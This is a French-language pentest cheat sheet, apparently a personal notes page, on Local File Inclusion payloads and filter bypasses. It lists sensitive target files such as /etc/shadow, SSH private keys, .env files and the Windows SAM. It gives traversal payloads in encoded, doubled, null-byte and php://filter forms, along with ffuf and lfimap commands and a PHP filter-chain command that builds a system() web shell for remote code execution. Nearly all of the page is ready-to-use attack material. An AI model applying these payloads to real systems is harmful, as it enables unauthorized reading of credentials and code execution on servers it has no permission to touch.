---
titre: "LFI — 3 - Payloads & bypass"
tags: [Failles, LFI, payloads, bypass, cheatsheet]
---

# LFI — 3. Payloads & bypass

> ⬅ [[LFI - Index]]

## Fichiers cibles (cheatsheet)
```
# Linux
/etc/passwd  /etc/hosts  /etc/shadow  /etc/hostname  /etc/issue
/root/.bash_history  /home/*/.ssh/id_rsa  /home/*/.ssh/authorized_keys
/var/www/html/config.php  /var/www/html/.env  /var/www/html/wp-config.php
/proc/self/environ  /proc/self/cmdline  /proc/self/fd/0-9
/etc/apache2/apache2.conf  /etc/nginx/nginx.conf
# Windows
C:\windows\win.ini   C:\windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config   C:\windows\System32\config\SAM
C:\xampp\apache\conf\httpd.conf
```

## Bypass de filtres (du plus courant au plus rare)

### Le filtre retire `../` une seule fois (non récursif)
```
....//....//....//etc/passwd          → après suppression du "../" central : ../
..././..././etc/passwd
....\/....\/etc/passwd
```

### Encodage
```
%2e%2e%2f            = ../          (URL encoding)
%252e%252e%252f      = ../          (double encoding, si décodé 2 fois)
..%c0%af             = ../          (overlong UTF-8, vieux serveurs)
%2e%2e/              variantes mixtes
```

### Extension forcée par l'app (`?page=X` → `X.php`)
```
# vieux PHP (<5.3.4) : null byte tronque l'extension ajoutée
/etc/passwd%00
# wrapper (ne subit pas l'ajout d'extension de la même façon)
php://filter/convert.base64-encode/resource=/etc/passwd
# path truncation (très vieux PHP) : ../ + longue chaîne pour dépasser la limite
```

### Filtre de préfixe (l'app impose un dossier de base, ex. /var/www/img/)
```
/var/www/img/../../../etc/passwd      → remonter depuis le préfixe imposé
# si le préfixe est concaténé APRÈS : chercher un wrapper ou un traversal encodé
```

### Filtre de mot-clé (`etc`, `passwd` blacklistés)
```
/etc//passwd      /etc/./passwd      /e"t"c/passwd (selon contexte)
php://filter/... /resource=/e%74c/passwd
```

## Outils
```bash
# fuzzing de fichiers
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://CIBLE/?file=FUZZ' -fs <err>
# exploitation semi-auto
python3 lfimap.py -u 'http://CIBLE/?file=PAYLOAD'
# PHP filter chain (LFI -> RCE sans fichier écrivable)
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
```
> Détection & concepts : [[1 - Repérage (LFI)]] · LFI→RCE : [[2 - Exploitation & techniques (LFI)]].
